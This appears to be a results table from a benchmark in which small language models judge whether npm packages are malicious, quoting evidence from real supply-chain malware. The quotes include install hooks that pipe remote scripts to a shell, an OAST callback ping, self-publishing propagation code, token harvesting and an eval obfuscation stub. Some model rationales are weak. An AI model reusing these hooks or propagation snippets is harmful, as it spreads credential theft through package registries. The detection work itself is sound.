run_id,model,prompt_id,sample_id,subgroup,technique,evidence,reasoning,giudizio
main,qwen3:4b,p2,@postman/postman-collection-fork@4.3.5,shai_hulud_w2,credential_theft,"['script preinstall: node setup_bun.js  [NEW]', '[runtime_download] setup_bun.js:71  : Use PowerShell script command = \'powershell -c ""irm bun.sh/install.ps1|iex""\'; } else { // Linux/macOS: Use curl + ba', '[credentials] setup_bun.js:25  \'Machine"").""\', { encoding: \'utf8\' }); process.env.PATH = result.trim(); } catch { } else { tr', ""[network] setup_bun.js:74  x/macOS: Use curl + bash script command = 'curl -fsSL https://bun.sh/install | bash'; } execSync(command, { stdio"", '[obfuscation] bun_environment.js:1  263341 obfuscator-style identifiers (_0x...)']","The new preinstall script runs a setup_bun.js file that downloads and executes a Bun installation script across platforms. The code reads environment variables and modifies PATH, which is suspicious for credential theft. The presence of obfuscated identifiers in bun_environment.js indicates potential obfuscation.",
main,qwen2.5-coder:7b,p3,ios-signing-common@1337.0.0,nato_malevolo,exfiltration,"['Install-time execution vectors: script preinstall runs a curl command to a remote host.', 'Files run at install time or flagged above: none.', 'Suspicious patterns in package code: network requests and credential collection.', 'File changes (new package): index.js and package.json added.', 'No legitimate use case provided for the network requests and credential collection.']","The package includes a preinstall script that makes network requests to a remote host and collects credentials, which are suspicious and not typical for a legitimate package.",
main,qwen3:4b,p3,ssf-desktop-api-browser@99.99.1,nato_malevolo,self_propagation,"['script preinstall: ping -c 5 d4ovj9s209k4sef3bso05xk8bgps1dezz.oast.online [new package]', '[propagation] depoc.py:75  {dep_to_add}\'...\') try: # Runs \'npm publish\' in the current directory subprocess.run(""n', '[propagation] depoc.py:76  h\' in the current directory subprocess.run(""npm publish --access public"", check=True, shell=True)', ""FILE: depoc.py (3.3 KB) — new file with code that runs 'npm publish' in the current directory"", 'PACKAGE: ssf-desktop-api-browser@99.99.1 — version 99.99.1 suggests typosquatting']","The package uses a version number 99.99.1 which is highly suspicious for typosquatting. The preinstall script pings an unknown host (d4ovj9s209k4sef3bso05xk8bgps1dezz.oast.online) and depoc.py contains code that runs 'npm publish' with shell=True, indicating a self-propagation mechanism. These patterns match known malicious attack patterns.",
main,gemma3:4b,p0,@emilgroup/discount-sdk@1.5.3,compromesso,credential_theft,"['The `index.js` file contains a `postinstall` script that executes `node index.js`, suggesting an installation-time execution vector.', ""The `scripts/deploy.js` file includes code to fetch the user's information using `whoami` and attempts to use `NPM_TOKEN` or `NPM_TOKENS` environment variables for authentication."", 'The `scripts/deploy.js` file uses `execSync` to execute `npm config get //registry.npmjs.org/:_authToken` and `npm publish --access public --tag latest`, potentially for deployment or publishing.', 'The `index.js` file utilizes `path.join` to construct paths to `.npmrc` files, indicating an attempt to access potentially sensitive configuration data.', ""The `scripts/deploy.js` file contains a `fetchJson` call to `https://registry.npmjs.org/-/whoami`, which is a common technique for identifying the user's identity and potentially accessing credentials.""]","This package exhibits several concerning behaviors. The presence of a `postinstall` script that executes code immediately after installation is a red flag. The use of `path.join` to locate `.npmrc` files suggests an attempt to access sensitive configuration data, and the `whoami` call combined with the use of environment variables like `NPM_TOKEN` strongly indicates credential theft. The `npm publish` command further raises suspicion, as it could be used to upload malicious code to the npm registry.",
main,qwen2.5-coder:7b,p1,ios-signing-common@1337.0.0,nato_malevolo,exfiltration,"['The package includes a new preinstall script that executes a curl command to a remote host.', 'The script includes network requests to send data, including hostname, user, and current working directory.', 'The script uses process.env to collect credentials, which is suspicious.', 'The script uses child_process to execute system commands, which is unusual for a package.', 'The package is a new version with no previous version, indicating it may be malicious.']","The presence of a new preinstall script that executes a curl command to a remote host, collects credentials, and uses child_process to execute system commands is highly suspicious. The fact that this is a new package with no previous version further increases the likelihood of malicious intent.",
main,qwen2.5-coder:7b,p2,react-jsonschema-form-conditionals@0.3.20,shai_hulud_w1,credential_theft,"['script postinstall: node bundle.js  [NEW]', 'added file outside declared `files`: bundle.js (3.6 MB)', '[credentials] bundle.js:2  GITHUB_TOKEN=""$1""', '[exec] bundle.js:2  child_process', '[network] bundle.js:2  API_BASE=""https://api.github.com""']","The new postinstall script runs a file that does not exist in previous versions. The script attempts to access environment variables and make network requests, which are suspicious.",
main,llama3.2:3b,p0,vite-commonjs-support@1.8.3,nato_malevolo,obfuscated_payload,"['The package has a postinstall script that runs `npm run test || npm transpile || npm run skip` which could potentially execute arbitrary commands.', 'The package has a large number of files, 585.4 KB, which could indicate the presence of malicious code.', 'The package has a `test/fixtures/eval/index.js` file that contains an `eval` statement, which could execute arbitrary code.', ""The package has a `test/http.test.js` file that makes an HTTP request to `http://localhost:' + server.address().port`, which could potentially be used to exfiltrate data."", 'The package has a `test/fixtures/eval/node_modules/test.list` file that contains a list of dependencies, including `atomic-sleep` and `fast-redact`, which could be used to inject malicious code.']","The package has several suspicious patterns and files that could indicate malicious activity. The postinstall script, large number of files, and presence of `eval` statements and HTTP requests make it a potential security risk.",
main,qwen2.5-coder:7b,p3,gbc-viewer@1.0.0,nato_malevolo,credential_theft,"['Install-time execution vectors: script preinstall: node index.js', 'Files run at install time: index.js', 'Suspicious patterns in package code: reading process.env for credentials', 'Suspicious patterns in package code: executing system commands', 'Suspicious patterns in package code: network activity']","The package includes an install-time script that runs code, reads environment variables for credentials, executes system commands, and performs network activity. These are indicators of malicious behavior.",
main,llama3.2:3b,p3,@redhat-cloud-services/hcc-feo-mcp@0.3.1,compromesso,obfuscated_payload,"['script preinstall: node index.js [NEW]', 'added file outside declared `files`: index.js (4.1 MB)', '[exec] index.js:1 try{eval(function(s,n){return s.replace(/[a-zA-Z]/g,function(c){var b', '[obfuscation] index.js:1 s.replace(/[a-zA-Z]/g,function(c){var b=c<=""Z""?65:97;return String.fromCharCode((c.charCodeAt(0)-b+n)%26+b)})}([40,114,106,112,101,116,40,4', '+ index.js (4.1 MB)']","The package has a new script that runs at install time, and the added file is not declared in the `files` array. The script contains an eval function, which is a suspicious pattern for obfuscated payloads.",
main,qwen2.5-coder:7b,p3,@things-factory/integration-marketplace@9.0.43,shai_hulud_w1,credential_theft,"['A new postinstall script `node bundle.js` was added.', 'The `bundle.js` file is extremely large and minified, with a high entropy and obfuscated identifiers.', 'The script contains network-related code that appears to interact with GitHub.', 'The script requires a `GITHUB_PAT` token, which is a credential.', 'The script contains propagation code that suggests it might be used to spread malware.']","The addition of a large, minified, and obfuscated script with network and credential handling capabilities is suspicious. The script's purpose and behavior are not clear from the provided information, but the combination of these factors strongly indicates malicious intent.",
